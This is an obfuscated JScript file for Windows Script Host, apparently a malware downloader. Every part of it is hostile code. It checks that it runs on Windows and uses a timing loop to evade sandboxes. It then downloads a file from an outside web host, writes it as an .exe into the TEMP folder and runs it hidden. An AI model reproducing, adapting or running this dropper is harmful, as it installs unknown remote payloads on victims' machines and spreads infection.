var _C = false;
var _X = "CreateObject";
var _UV = function _FW() {return WScript[_X]("WScript"+".Shell");}(), _L1 = 11;
var _N = "MSXML2.XMLHTTP";
var _Q = 2123213;
var _W = 0;
function _WE(_LO){_UV["Run"](_LO, _W, _W);};
function _KE(){return _N + "";};
function _G(_LX, _J0){_W = _W * 1; return _LX - _J0;};
function _QZ(){return _X;};
/*@cc_on
  @if (@_win32 || @_win64)
    _C = true;
  @end
@*/
if (_C)
{
var _VF = "";
function _OI(){return 22;};
var _VH = 0; var _DA = 0;
function _PU()
{
var _AA = new this["Date"]();
var _YV = _AA["getUTCMilliseconds"]();
WScript["Sleep"](_OI());
var _AA = new this["Date"]();
var _L0 = _AA["getUTCMilliseconds"]();
WScript["Sleep"](_OI());
var _AA = new this["Date"]();
var _GY = _AA["getUTCMilliseconds"]();
var _VH = "_J";
_VH = _G(_L0, _YV);
var _DA = "_B";
_DA = _G(_GY, _L0);
_VF = "open";
return _G(_VH, _DA);
}
var _X0 = false;
var _ID = false;
for (var _L = _W; _L < _OI() * 1; _L++){if (_PU() != _W){
_X0 = true; 
_DA = "31" + 11 * _VH + _DA; 
_ID = true; 
break;
}}
function _AO() {return ((_X0 == true) && (_X0 == _ID)) ? 1 : _W;};
if (_X0 && _AO() && _ID){
function _CB() {return _UV["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "0dotgsnmxyiTMro.ex" + "e";};
 _DC = _KE();
 _G1 = WScript[_X](_DC);
 var _BE = 1;
 while (_BE){
try {
	if (_BE == 1)
	{
		_G1[_VF]("GET", "http://sterdicustom.com/w3iks", false);
		_G1["send"]();
		_CT = "Sleep";
	}
	WScript[_CT](_OI() + 120); 
	if (_G1["readystate"] < 2 * 2) continue;
	_BE = _W;
	function _WY(_G0) {var _U = (1, 2, 3, 4, 5, _G0); return _U;};
	_D = WScript[_QZ()]("ADODB.Stream");
	_DC = _D;
	_DC[_VF]();
	_DC["type"] = _WY(1);
	_DC["write"](_G1["ResponseBody"]);
	_D["position"] = _WY(_W);
	_DC["Save" + "ToFile"](_CB(), 2);
	_D["cl"+"ose"]();
	_M = _CB();
	_WE(_M);
} catch(_S){};
}
}
}

